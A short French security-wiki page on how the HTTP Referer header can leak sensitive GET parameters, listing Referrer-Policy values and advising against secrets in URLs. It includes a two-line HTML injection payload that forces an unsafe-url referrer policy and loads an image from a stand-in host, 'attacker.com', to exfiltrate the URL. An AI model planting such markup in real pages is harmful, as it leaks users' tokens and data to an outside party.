# HTTP intéressant

{{#include ../banners/hacktricks-training.md}}

## En-têtes Referrer et politique

Referrer est l'en-tête utilisé par les navigateurs pour indiquer quelle était la page précédemment visitée.

### Informations sensibles leakées

Si, à un moment donné, des informations sensibles se trouvent dans les paramètres d'une requête GET au sein d'une page web, si la page contient des liens vers des sources externes ou si un attaquant parvient à faire visiter à l'utilisateur une URL contrôlée par l'attaquant ou à lui suggérer de le faire (ingénierie sociale), il pourrait exfiltrer les informations sensibles contenues dans la dernière requête GET.

### Mitigation

Vous pouvez demander au navigateur de suivre une **Referrer-policy** qui pourrait **empêcher** l'envoi des informations sensibles à d'autres applications web :
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Contre-mesure

Vous pouvez contourner cette règle à l'aide d'une balise meta HTML (l'attaquant doit exploiter une injection HTML) :
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Défense

Ne placez jamais de données sensibles dans les paramètres GET ou les chemins de l'URL.

{{#include ../banners/hacktricks-training.md}}
